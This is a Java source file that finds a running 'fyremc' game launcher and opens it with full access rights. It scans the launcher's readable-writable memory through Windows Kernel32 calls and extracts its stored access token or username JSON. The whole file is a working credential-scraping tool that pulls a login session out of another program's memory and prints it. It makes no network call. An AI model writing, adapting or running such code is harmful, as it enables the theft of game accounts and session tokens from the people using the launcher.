package azahriah.nemhibas.jdktest;

import azahriah.nemhibas.jdktest.natives.windows.kernel32.Kernel32;
import azahriah.nemhibas.jdktest.natives.windows.kernel32._MEMORY_BASIC_INFORMATION;
import jdk.incubator.foreign.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {
    private static final int CHUNK_SIZE = 512;

    public static void main(String[] args) {
        System.out.println("Porog a fornettigyar");
        ExecutorService executor = Executors.newFixedThreadPool(8);

        Optional<ProcessHandle> process = ProcessHandle.allProcesses()
            .filter(proc -> proc.info().command().orElse("").toLowerCase().contains("fyremc"))
            .min(Comparator.comparingDouble(proc -> proc.info().startInstant().get().getEpochSecond()));

        if (process.isEmpty()) {
            System.out.println("[!] The launcher is not running.");
            return;
        }

        ProcessHandle proc = process.get();
        executor.execute(() -> {
            String res = tryFindAccessToken(proc.pid());
            if (!res.isEmpty()) {
                System.out.println("[!] Found something in " + proc.pid() + " (P): " + res);
            }
        });
        executor.shutdown();
    }

    public static String makeReadable(byte[] buffer) {
        StringBuilder plus = new StringBuilder();
        StringBuilder s = new StringBuilder();
        for (byte a : buffer) {
            if (a < 5) {
                plus = new StringBuilder();
            } else {
                if (plus.length() < 5) {
                    plus.append((char) a);
                    if (plus.length() == 5) {
                        s.append(plus);
                    }
                } else {
                    s.append((char) a);
                }
            }
        }
        return s.toString();
    }

    public static String tryFindAccessToken(long pid) {
        MemoryAddress handle = Kernel32.OpenProcess(Kernel32.PROCESS_ALL_ACCESS(), 0, (int) pid);

        try {
            if (handle == MemoryAddress.NULL) {
                throw new RuntimeException("failed to open handle");
            }

            try (ResourceScope scope = ResourceScope.newConfinedScope()) {
                SegmentAllocator segmentAllocator = SegmentAllocator.ofScope(scope);
                MemorySegment buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, CHUNK_SIZE);

                MemoryAddress pagePointer = MemoryAddress.ofLong(0);
                MemorySegment memoryInfo = _MEMORY_BASIC_INFORMATION.allocate(scope);

                while (Kernel32.VirtualQueryEx(handle, pagePointer, memoryInfo, _MEMORY_BASIC_INFORMATION.sizeof()) != 0) {
                    if (_MEMORY_BASIC_INFORMATION.State$get(memoryInfo) == Kernel32.MEM_COMMIT() &&
                            _MEMORY_BASIC_INFORMATION.Protect$get(memoryInfo) == Kernel32.PAGE_READWRITE()) {
                        for (long i = 0; i < _MEMORY_BASIC_INFORMATION.RegionSize$get(memoryInfo); i += CHUNK_SIZE) {
                            MemoryAddress readPointer = pagePointer.addOffset(i);

                            if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
                                String bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);

                                boolean runOld;
                                int offset;
                                int endIdx;
                                if ((offset = bufferString.indexOf("{\"access")) > -1) {
                                    runOld = true;
                                    endIdx = bufferString.substring(offset).indexOf("}");
                                } else if ((offset = bufferString.indexOf("{\"username\"")) > -1 && !bufferString.contains(":{\"username\"")) {
                                    runOld = false;
                                    endIdx = bufferString.substring(offset).indexOf(",\"s");
                                } else {
                                    continue;
                                }

                                if (endIdx > 0) {
                                    bufferString = makeReadable(buffer.asSlice(offset, endIdx).toByteArray());
                                    return bufferString + (runOld ? "}}" : "}");
                                }

                                buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, CHUNK_SIZE);
                                if (Kernel32.ReadProcessMemory(handle, readPointer.addOffset(offset), buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
                                    bufferString = makeReadable(buffer.toByteArray());
                                    endIdx = runOld ? bufferString.indexOf("}") : bufferString.indexOf(",\"s");

                                    if (endIdx == -1) {
                                        continue;
                                    }

                                    return bufferString.substring(0, endIdx) + (runOld ? "}}" : "}");
                                }
                            }
                        }
                    }

                    pagePointer = pagePointer.addOffset(_MEMORY_BASIC_INFORMATION.RegionSize$get(memoryInfo));
                }
            }
            return "";
        } finally {
            Kernel32.CloseHandle(handle);
        }
    }
}
